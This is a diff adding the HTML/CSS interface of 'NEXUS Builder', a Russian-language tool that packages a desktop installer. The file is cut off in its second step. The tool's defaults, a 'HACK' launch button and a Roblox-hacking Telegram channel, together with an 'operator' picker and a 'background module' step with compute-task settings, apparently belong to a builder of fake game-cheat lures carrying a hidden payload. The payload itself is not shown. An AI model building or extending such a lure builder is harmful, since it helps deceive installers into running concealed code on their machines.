@@ -1,0 +1,1853 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NEXUS Builder</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+
+    input, textarea, .selectable-text {
+      user-select: text !important;
+      -webkit-user-select: text !important;
+    }
+
+    :root {
+      --bg-base: #060709;
+      --bg-surface: rgba(14, 16, 23, 0.75);
+      --bg-card: rgba(18, 20, 29, 0.78);
+      --border-subtle: rgba(255, 255, 255, 0.08);
+      --border-light: rgba(255, 255, 255, 0.16);
+      --border-focus: rgba(255, 255, 255, 0.4);
+      --text-primary: #ffffff;
+      --text-secondary: #9499ad;
+      --text-tertiary: #52566b;
+      --accent: #ffffff;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #090a0f;
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      color: var(--text-primary);
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .builder-frame {
+      width: 100vw;
+      height: 100vh;
+      background: #090a0f;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .builder-topbar {
+      height: 52px;
+      background: #0d0f16;
+      border-bottom: 1px solid var(--border-subtle);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      flex-shrink: 0;
+      -webkit-app-region: drag;
+    }
+
+    .builder-brand {
+      font-size: 13.5px;
+      font-weight: 800;
+      letter-spacing: 0.1em;
+      color: #ffffff;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .builder-nav {
+      display: flex;
+      gap: 4px;
+      background: rgba(0, 0, 0, 0.35);
+      padding: 3px;
+      border-radius: 9px;
+      border: 1px solid var(--border-subtle);
+      -webkit-app-region: no-drag;
+    }
+
+    .b-nav-item {
+      padding: 6px 14px;
+      border-radius: 7px;
+      border: none;
+      background: transparent;
+      color: var(--text-secondary);
+      font-size: 12px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.18s ease;
+    }
+
+    .b-nav-item:hover {
+      color: #ffffff;
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .b-nav-item.active {
+      color: #060709;
+      background: #ffffff;
+      font-weight: 700;
+      box-shadow: 0 2px 10px rgba(255,255,255,0.2);
+    }
+
+    .win-actions {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      -webkit-app-region: no-drag;
+    }
+
+    .win-action-btn {
+      width: 28px;
+      height: 28px;
+      border-radius: 7px;
+      border: 1px solid transparent;
+      background: rgba(255, 255, 255, 0.04);
+      color: var(--text-secondary);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      transition: all 0.15s ease;
+    }
+
+    .win-action-btn:hover {
+      background: rgba(255, 255, 255, 0.1);
+      color: #ffffff;
+    }
+
+    .win-action-btn.close:hover {
+      background: #dc2626;
+      color: #ffffff;
+    }
+
+    .user-badge {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #141722;
+      border: 1px solid var(--border-subtle);
+      border-radius: 7px;
+      padding: 4px 10px;
+      font-size: 11px;
+      margin-right: 12px;
+      -webkit-app-region: no-drag;
+    }
+
+    .user-badge strong {
+      color: #ffffff;
+    }
+
+    .user-role {
+      background: #232838;
+      color: #ffffff;
+      font-size: 9px;
+      font-weight: 800;
+      padding: 1px 5px;
+      border-radius: 3px;
+    }
+
+    .btn-logout {
+      background: transparent;
+      border: none;
+      color: var(--text-secondary);
+      font-size: 10px;
+      cursor: pointer;
+      margin-left: 4px;
+      text-decoration: underline;
+    }
+    .btn-logout:hover { color: #fff; }
+
+    /* Cinematic 10s Startup Loader */
+    .startup-screen {
+      position: absolute;
+      inset: 0;
+      background: #060709;
+      z-index: 200;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.35s ease, visibility 0.35s ease;
+    }
+
+    .startup-screen.hidden {
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+
+    .startup-title {
+      font-size: 16px;
+      font-weight: 800;
+      letter-spacing: 0.12em;
+      color: #ffffff;
+      margin-bottom: 18px;
+      text-transform: uppercase;
+    }
+
+    .startup-track {
+      width: 220px;
+      height: 3px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 999px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .startup-fill {
+      position: absolute;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      width: 0%;
+      background: #ffffff;
+      border-radius: 999px;
+      box-shadow: 0 0 12px rgba(255, 255, 255, 0.8);
+      transition: width 0.05s linear;
+    }
+
+    .startup-sub {
+      font-size: 11px;
+      color: var(--text-secondary);
+      margin-top: 12px;
+      font-family: 'JetBrains Mono', monospace;
+      letter-spacing: 0.02em;
+      height: 15px;
+    }
+
+    .startup-timer {
+      font-size: 10.5px;
+      color: var(--text-tertiary);
+      margin-top: 5px;
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    .builder-body {
+      flex: 1;
+      padding: 12px 16px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      min-height: 0;
+    }
+
+    .b-step-view {
+      display: none;
+      flex: 1;
+      flex-direction: column;
+      overflow: hidden;
+      min-height: 0;
+    }
+
+    .b-step-view.active {
+      display: flex;
+      animation: viewFadeIn 0.2s ease forwards;
+    }
+
+    .b-grid-2 {
+      display: grid;
+      grid-template-columns: 1.15fr 1fr;
+      gap: 12px;
+      flex: 1;
+      min-height: 0;
+    }
+
+    .b-card {
+      background: rgba(17, 20, 30, 0.85);
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      padding: 12px 14px;
+      backdrop-filter: blur(12px);
+      display: flex;
+      flex-direction: column;
+      min-height: 0;
+    }
+
+    .b-card-title {
+      font-size: 10.5px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: #ffffff;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-shrink: 0;
+    }
+
+    .b-field-group {
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+      margin-bottom: 8px;
+    }
+
+    .b-field-group:last-child {
+      margin-bottom: 0;
+    }
+
+    .b-label {
+      font-size: 11px;
+      color: var(--text-secondary);
+      font-weight: 600;
+    }
+
+    .b-input, .b-select {
+      height: 32px;
+      background: #07080c;
+      border: 1px solid var(--border-subtle);
+      border-radius: 7px;
+      padding: 0 10px;
+      color: #ffffff;
+      font-size: 12px;
+      font-family: inherit;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .b-input:focus, .b-select:focus {
+      border-color: #ffffff;
+      box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.2);
+    }
+
+    .b-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+
+    .b-build-btn {
+      height: 38px;
+      background: #ffffff;
+      color: #060709;
+      border: none;
+      border-radius: 8px;
+      font-family: inherit;
+      font-size: 11.5px;
+      font-weight: 800;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: all 0.18s cubic-bezier(0.16, 1, 0.3, 1);
+      box-shadow: 0 4px 14px rgba(255, 255, 255, 0.15);
+      margin-top: 10px;
+    }
+
+    .b-build-btn:hover {
+      transform: translateY(-1.5px);
+      box-shadow: 0 8px 24px rgba(255, 255, 255, 0.25);
+      background: #f1f5f9;
+    }
+
+    .b-build-btn:active {
+      transform: translateY(0.5px);
+    }
+
+    .b-build-btn:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .c-btn {
+      padding: 6px 12px;
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid var(--border-light);
+      border-radius: 7px;
+      color: #ffffff;
+      font-size: 11.5px;
+      font-family: inherit;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.18s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .c-btn:hover {
+      background: #ffffff;
+      color: #060709;
+    }
+
+    .spec-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 7px 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      font-size: 11.5px;
+    }
+
+    .spec-row:last-child {
+      border-bottom: none;
+      padding-bottom: 0;
+    }
+
+    .spec-row span {
+      color: var(--text-secondary);
+    }
+
+    .spec-row strong {
+      font-family: 'JetBrains Mono', monospace;
+      color: #ffffff;
+      font-weight: 500;
+    }
+
+    .console-container {
+      position: relative;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      margin-top: 8px;
+      min-height: 0;
+    }
+
+    .b-log-box {
+      flex: 1;
+      background: #07080c;
+      border: 1px solid var(--border-subtle);
+      border-radius: 8px;
+      padding: 12px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: #9499ad;
+      line-height: 1.6;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    .copy-log-btn {
+      position: absolute;
+      top: 8px;
+      right: 12px;
+      padding: 4px 10px;
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 6px;
+      color: #ffffff;
+      font-size: 10.5px;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      backdrop-filter: blur(8px);
+    }
+
+    .copy-log-btn:hover {
+      background: #ffffff;
+      color: #060709;
+    }
+
+    /* Login Modal Overlay */
+    .login-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(6, 7, 9, 0.92);
+      backdrop-filter: blur(20px);
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .login-box {
+      width: 380px;
+      background: #11141e;
+      border: 1px solid var(--border-light);
+      border-radius: 16px;
+      padding: 28px 24px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .login-title {
+      font-size: 16px;
+      font-weight: 800;
+      color: #ffffff;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+
+    .login-sub {
+      font-size: 12px;
+      color: var(--text-secondary);
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .login-err {
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px solid #ef4444;
+      color: #f87171;
+      padding: 8px 12px;
+      border-radius: 8px;
+      font-size: 11.5px;
+      margin-bottom: 14px;
+      display: none;
+    }
+
+    /* Compute Modules Styles */
+    .module-card {
+      background: #090b10;
+      border: 1px solid var(--border-subtle);
+      border-radius: 10px;
+      padding: 12px;
+      margin-bottom: 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+    .module-card:hover {
+      border-color: rgba(255, 255, 255, 0.2);
+    }
+    .module-card.disabled {
+      opacity: 0.6;
+    }
+    .module-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      padding-bottom: 8px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    }
+    .module-title-wrap {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .module-badge {
+      font-size: 9px;
+      font-weight: 800;
+      padding: 2px 6px;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+    .module-badge.active {
+      background: rgba(34, 197, 94, 0.15);
+      color: #4ade80;
+      border: 1px solid rgba(34, 197, 94, 0.3);
+    }
+    .module-badge.inactive {
+      background: rgba(148, 163, 184, 0.1);
+      color: #94a3b8;
+      border: 1px solid rgba(148, 163, 184, 0.2);
+    }
+    .module-actions {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .btn-icon-tiny {
+      width: 26px;
+      height: 26px;
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid var(--border-subtle);
+      border-radius: 6px;
+      color: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-size: 11px;
+      transition: all 0.15s ease;
+    }
+    .btn-icon-tiny:hover {
+      background: #ffffff;
+      color: #060709;
+    }
+    .btn-icon-tiny.del:hover {
+      background: #ef4444;
+      border-color: #ef4444;
+      color: #ffffff;
+    }
+    .task-box {
+      background: rgba(255, 255, 255, 0.02);
+      border: 1px solid rgba(255, 255, 255, 0.04);
+      border-radius: 8px;
+      padding: 8px 10px;
+    }
+    .task-box-title {
+      font-size: 10px;
+      font-weight: 800;
+      color: #60a5fa;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .task-grid-top {
+      display: grid;
+      grid-template-columns: 220px 1fr;
+      gap: 12px;
+      margin-bottom: 8px;
+    }
+    .task-grid-bottom {
+      display: grid;
+      grid-template-columns: 1.4fr 100px 1fr;
+      gap: 12px;
+    }
+    .task-box .b-input, .task-box .b-select {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11.5px;
+      height: 32px;
+      padding: 0 10px;
+    }
+    .module-slider-box {
+      background: rgba(0, 0, 0, 0.25);
+      border: 1px solid rgba(255, 255, 255, 0.04);
+      border-radius: 8px;
+      padding: 8px 10px;
+    }
+    /* Color Customization & Live Client Preview Styles */
+    .color-swatches-row {
+      display: flex;
+      gap: 6px;
+      margin-top: 6px;
+      align-items: center;
+    }
+    .color-swatch-btn {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      cursor: pointer;
+      transition: transform 0.15s ease, border-color 0.15s ease;
+      outline: none;
+    }
+    .color-swatch-btn:hover {
+      transform: scale(1.15);
+      border-color: #ffffff;
+    }
+    .color-swatch-btn.active {
+      border-color: #ffffff;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.6);
+      transform: scale(1.1);
+    }
+    .color-picker-input {
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      appearance: none;
+      width: 32px;
+      height: 32px;
+      background: none;
+      border: 1px solid var(--border-subtle);
+      border-radius: 6px;
+      cursor: pointer;
+      padding: 0;
+    }
+    .color-picker-input::-webkit-color-swatch-wrapper {
+      padding: 2px;
+    }
+    .color-picker-input::-webkit-color-swatch {
+      border: none;
+      border-radius: 4px;
+    }
+
+    /* Live Preview Mini Frame */
+    /* Live Preview Replica Frame */
+    .client-preview-window {
+      width: 100%;
+      height: 100%;
+      min-height: 380px;
+      background: #020304;
+      border: 1px solid var(--border-light);
+      border-radius: 12px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
+    }
+    .cp-top-header {
+      height: 38px;
+      padding: 0 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      background: rgba(6, 7, 9, 0.85);
+      backdrop-filter: blur(12px);
+      z-index: 10;
+      flex-shrink: 0;
+    }
+    .cp-brand-name {
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 0.1em;
+      color: #ffffff;
+    }
+    .cp-nav-pill {
+      display: flex;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 6px;
+      padding: 2px;
+      gap: 2px;
+    }
+    .cp-nav-pill-btn {
+      padding: 3px 8px;
+      border-radius: 4px;
+      border: none;
+      background: transparent;
+      color: var(--text-secondary);
+      font-size: 9.5px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .cp-nav-pill-btn.active {
+      background: rgba(255, 255, 255, 0.12);
+      color: #ffffff;
+    }
+    .cp-win-actions {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .cp-win-btn {
+      width: 18px;
+      height: 18px;
+      border-radius: 4px;
+      border: 1px solid transparent;
+      background: rgba(255, 255, 255, 0.06);
+      color: var(--text-secondary);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 9px;
+    }
+    .cp-workspace {
+      flex: 1;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 2;
+      padding: 14px;
+    }
+    .cp-hero-card {
+      width: 250px;
+      background: rgba(14, 16, 23, 0.78);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 14px;
+      padding: 16px 14px 12px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.65);
+      backdrop-filter: blur(16px);
+      z-index: 3;
+    }
+    .cp-avatar-disc {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      background: #090b10;
+      border: 1.5px solid rgba(255, 255, 255, 0.16);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow: hidden;
+      margin-bottom: 8px;
+      box-shadow: 0 8px 18px rgba(0, 0, 0, 0.5);
+    }
+    .cp-card-target-name {
+      font-size: 11.5px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 10px;
+      letter-spacing: -0.01em;
+      text-align: center;
+    }
+    .cp-input-wrap {
+      width: 100%;
+      height: 32px;
+      background: #090a0f;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 0 10px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+    .cp-input-placeholder {
+      font-size: 10.5px;
+      color: var(--text-tertiary);
+    }
+    .cp-btn-primary {
+      width: 100%;
+      height: 34px;
+      background: #ffffff;
+      border: none;
+      border-radius: 8px;
+      color: #060709;
+      font-family: inherit;
+      font-size: 10.5px;
+      font-weight: 800;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 14px rgba(255, 255, 255, 0.18);
+      margin-bottom: 6px;
+      transition: background-color 0.2s ease, color 0.2s ease;
+    }
+    .cp-btn-secondary {
+      width: 100%;
+      height: 26px;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 7px;
+      color: var(--text-secondary);
+      font-size: 9px;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+    }
+    .cp-bg-overlay {
+      position: absolute;
+      inset: 0;
+      background-size: cover;
+      background-position: center;
+      opacity: 0.35;
+      filter: grayscale(100%);
+      pointer-events: none;
+      z-index: 1;
+    }
+    .cp-gradient-overlay {
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at 50% 30%, transparent 20%, #020304 90%);
+      pointer-events: none;
+      z-index: 2;
+    }
+
+    @keyframes viewFadeIn {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- LOGIN OVERLAY -->
+  <div class="login-overlay" id="loginOverlay" style="display: none;">
+    <div class="login-box">
+      <div style="font-size: 32px; text-align: center; margin-bottom: 10px;">🔒</div>
+      <div class="login-title">Вход в NEXUS Builder</div>
+      <div class="login-sub">Авторизуйтесь для доступа к сборщику</div>
+      <div class="login-err" id="loginErrMsg">Неверный логин или пароль</div>
+
+      <div class="b-field-group">
+        <label class="b-label">Логин:</label>
+        <input type="text" class="b-input" id="authLoginInput" placeholder="Имя профиля">
+      </div>
+
+      <div class="b-field-group" style="margin-top: 6px;">
+        <label class="b-label">Пароль:</label>
+        <input type="password" class="b-input" id="authPassInput" placeholder="••••••••">
+      </div>
+
+      <label style="display:flex; align-items:center; gap:8px; font-size:11.5px; color:var(--text-secondary); margin: 12px 0 18px; cursor:pointer;">
+        <input type="checkbox" id="authRememberChk" checked style="accent-color:#ffffff;">
+        Запомнить вход на этом ПК
+      </label>
+
+      <button class="b-build-btn" style="margin-top:0;" onclick="submitLogin()">Войти в систему</button>
+    </div>
+  </div>
+
+  <div class="builder-frame">
+    <!-- 10-SECOND CINEMATIC STARTUP LOADER -->
+    <div class="startup-screen" id="builderStartupScreen">
+      <div class="startup-title">NEXUS BUILDER</div>
+      <div class="startup-track">
+        <div class="startup-fill" id="builderStartupFill"></div>
+      </div>
+      <div class="startup-sub" id="builderStartupSub">Инициализация среды...</div>
+      <div class="startup-timer" id="builderStartupTimer">10.0 сек</div>
+    </div>
+
+    <!-- Top Bar -->
+    <div class="builder-topbar" onmousedown="if(event.button === 0 && !event.target.closest('button, input, select, nav, .win-actions, .user-badge')) { sendHostAction('dragWindow'); }">
+      <div class="builder-brand">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
+        NEXUS BUILDER
+      </div>
+
+      <!-- Navigation Steps -->
+      <nav class="builder-nav">
+        <button class="b-nav-item active" id="bStepBtn1" onclick="switchBuilderStep(1)">1. Программа</button>
+        <button class="b-nav-item" id="bStepBtn2" onclick="switchBuilderStep(2)">2. Настройки</button>
+        <button class="b-nav-item" id="bStepBtn3" onclick="switchBuilderStep(3)">3. Фоновый модуль</button>
+        <button class="b-nav-item" id="bStepBtn4" onclick="switchBuilderStep(4)">4. Сборка</button>
+      </nav>
+
+      <div style="display:flex; align-items:center;">
+        <div class="user-badge" id="userBadge" style="display:none;">
+          <span>👤 <strong id="userNameTxt">Shonll</strong></span>
+          <span class="user-role" id="userRoleTxt">ADMIN</span>
+          <button class="btn-logout" onclick="logout()">Выйти</button>
+        </div>
+
+        <div class="win-actions">
+          <button class="win-action-btn" onclick="sendHostAction('minimize')">—</button>
+          <button class="win-action-btn close" onclick="sendHostAction('close')">✕</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Builder Step Views Container -->
+    <div class="builder-body">
+      
+      <!-- ШАГ 1: ПРОГРАММА -->
+      <div class="b-step-view active" id="bStepView1">
+        <div class="b-grid-2">
+          <div class="b-card">
+            <div class="b-card-title">Параметры программы</div>
+            
+            <div class="b-row">
+              <div class="b-field-group">
+                <label class="b-label">Название программы:</label>
+                <input type="text" class="b-input" id="bAppName" value="RAH" oninput="updateSummary()">
+              </div>
+              <div class="b-field-group">
+                <label class="b-label">Издатель / Автор:</label>
+                <input type="text" class="b-input" id="bAuthor" value="Убежище">
+              </div>
+            </div>
+
+            <div class="b-row" style="margin-top: 10px;">
+              <div class="b-field-group">
+                <label class="b-label">Версия релиза:</label>
+                <input type="text" class="b-input" id="bVersion" value="8.0.3" oninput="updateSummary()">
+              </div>
+              <div class="b-field-group">
+                <label class="b-label">Иконка приложения (.ico):</label>
+                <div style="display:flex; gap:6px;">
+                  <select class="b-select" id="bIconSelect" style="flex:1;" onchange="onIconPresetChange(this.value)">
+                    <option value="rah">RAH (Буква R)</option>
+                    <option value="nexus">Nexus (Буква N)</option>
+                    <option value="thunder">⚡ Thunder (Молния)</option>
+                    <option value="fire">🔥 Fire (Огонь)</option>
+                    <option value="svyaz">Svyaz (Связь)</option>
+                    <option value="singer">Singer</option>
+                    <option value="cyber">Cyber</option>
+                    <option value="__custom__">[ Выбрать свой .ico... ]</option>
+                  </select>
+                  <button class="c-btn" style="height:36px; padding:0 10px;" onclick="chooseCustomIco()">Обзор</button>
+                </div>
+              </div>
+            </div>
+
+            <div class="b-field-group" style="margin-top: 10px;">
+              <label class="b-label">Папка вывода:</label>
+              <div style="display:flex; gap:8px;">
+                <input type="text" class="b-input selectable-text" id="bOutputPath" value="C:\Users\user\Desktop\NEXUS_Builds_v8.0.3" style="flex:1;" readonly>
+                <button class="c-btn" style="height:36px;" onclick="chooseOutputFolder()">Выбрать папку</button>
+              </div>
+            </div>
+
+            <button class="b-build-btn" style="margin-top:auto;" onclick="switchBuilderStep(2)">
+              Далее к настройкам →
+            </button>
+          </div>
+
+          <!-- Сводка и статус -->
+          <div class="b-card">
+            <div class="b-card-title">Сводка дистрибутива</div>
+            
+            <div class="spec-row">
+              <span>Шаблон приложения</span>
+              <strong style="color: #ffffff;" id="summaryTemplate">8.0.3 Ready (1.5 MB)</strong>
+            </div>
+            <div class="spec-row">
+              <span>Стиль интерфейса</span>
+              <strong>Monochrome Dark (Web)</strong>
+            </div>
+            <div class="spec-row">
+              <span>Фон по умолчанию</span>
+              <strong>Griffith (ч/б)</strong>
+            </div>
+            <div class="spec-row">
+              <span>Компрессор</span>
+              <strong>Inno Setup 6 / LZMA2</strong>
+            </div>
+            <div class="spec-row">
+              <span>Иконка дистрибутива</span>
+              <strong id="summaryIconName">rah.ico</strong>
+            </div>
+
+            <div style="margin-top:auto; font-size:11px; color:var(--text-secondary); line-height:1.5; background:rgba(0,0,0,0.25); padding:10px; border-radius:8px; border:1px solid var(--border-subtle);">
+              Дистрибутив собирается на базе современного веб-дизайна Chromium/WebView2 с мгновенным откликом и полной поддержкой кастомных фонов и стилей.
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ШАГ 2: НАСТРОЙКИ И КАСТОМИЗАЦИЯ -->
+      <div class="b-step-view" id="bStepView2">
+        <div class="b-grid-2">
+          <!-- Левая колонка: Основные настройки и Цветовая схема -->
+          <div class="b-card" style="overflow-y:auto; max-height:calc(100vh - 120px);">
+            <div class="b-card-title">Основные настройки и цвета</div>
+            
+            <div class="b-field-group">
+              <label class="b-label">Профиль оператора:</label>
+              <select class="b-select" id="bOperatorSelect" onchange="onOperatorChange(this.value)">
+                <option value="Shonll">Shonll (Главный Администратор)</option>
+                <option value="HuilaEbanaya">HuilaEbanaya</option>
+                <option value="DildMan">DildMan</option>
+                <option value="SinGeR1isss">SinGeR1isss</option>
+                <option value="saha_kakaha122">saha_kakaha122</option>
+                <option value="Ximza1">Ximza1</option>
+                <option value="__custom__">[ Ввести вручную... ]</option>
+              </select>
+              <input type="text" class="b-input" id="bCustomOperatorInput" placeholder="Имя оператора" style="display:none; margin-top:6px;">
+            </div>
+
+            <!-- БЛОК ВЫБОРА ЦВЕТОВ И ТЕМЫ -->
+            <div class="b-field-group" style="margin-top: 10px; background:#07080c; border:1px solid var(--border-subtle); border-radius:8px; padding:10px;">
+              <div style="display:flex; justify-content:space-between; align-items:center;">
+                <label class="b-label" style="color:#ffffff;">Цветовой акцент приложения:</label>
+                <div style="display:flex; align-items:center; gap:6px;">
+                  <input type="color" class="color-picker-input" id="colorPickerAccent" value="#ffffff" onchange="onCustomColorPick(this.value)">
+                  <span id="txtAccentHex" style="font-family:'JetBrains Mono'; font-size:11px; color:#ffffff;">#FFFFFF</span>
+                </div>
+              </div>
+              <div class="color-swatches-row">
+                <button type="button" class="color-swatch-btn active" style="background:#ffffff;" title="Monochrome White" onclick="selectThemePreset('#ffffff', '#0D0E12', this)"></button>
+                <button type="button" class="color-swatch-btn" style="background:#00f0ff;" title="Cyber Cyan" onclick="selectThemePreset('#00f0ff', '#0a1018', this)"></button>
+                <button type="button" class="color-swatch-btn" style="background:#a855f7;" title="Purple Haze" onclick="selectThemePreset('#a855f7', '#120a1c', this)"></button>
+                <button type="button" class="color-swatch-btn" style="background:#22c55e;" title="Matrix Green" onclick="selectThemePreset('#22c55e', '#08140c', this)"></button>
+                <button type="button" class="color-swatch-btn" style="background:#ef4444;" title="Crimson Red" onclick="selectThemePreset('#ef4444', '#180a0a', this)"></button>
+                <button type="button" class="color-swatch-btn" style="background:#f59e0b;" title="Amber Gold" onclick="selectThemePreset('#f59e0b', '#181206', this)"></button>
+              </div>
+            </div>
+
+            <div class="b-field-group" style="margin-top: 10px;">
+              <label class="b-label">Кастомный фон (.jpg, .png):</label>
+              <div style="display:flex; gap:8px;">
+                <input type="text" class="b-input" style="flex:1;" id="bCustomBgText" value="По умолчанию (Гриффит, ч/б)" readonly>
+                <button class="c-btn" style="height:36px;" onclick="chooseCustomBg()">Обзор...</button>
+                <button class="c-btn" style="height:36px;" onclick="resetCustomBg()">Сброс</button>
+              </div>
+            </div>
+
+            <div class="b-field-group" style="margin-top: 10px;">
+              <label class="b-label">Telegram-канал поддержки:</label>
+              <input type="text" class="b-input" id="bTgChannel" value="@robloxvzlomez">
+            </div>
+
+            <div class="b-field-group" style="margin-top: 10px;">
+              <label class="b-label">Текст кнопки запуска:</label>
+              <input type="text" class="b-input" id="bBtnText" value="ВЗЛОМАТЬ" oninput="updateLiveClientPreview()">
+            </div>
+
+            <div style="display:flex; gap:10px; margin-top:14px;">
+              <button class="c-btn" style="flex:1; height:40px;" onclick="switchBuilderStep(1)">← Назад</button>
+              <button class="b-build-btn" style="flex:1; margin-top:0; height:40px;" onclick="switchBuilderStep(3)">Далее →</button>
+            </div>
+          </div>
+
+          <!-- Правая колонка: ЖИВОЙ ПРЕДПРОСМОТР ГОТОВОГО ПРИЛОЖЕНИЯ -->
+          <div class="b-card">
+            <div class="b-card-title">
+              <span>Интерактивный предпросмотр приложения</span>
+              <span style="font-family:'JetBrains Mono'; font-size:10px; color:#4ade80;">● LIVE MOCKUP</span>
+            </div>
+
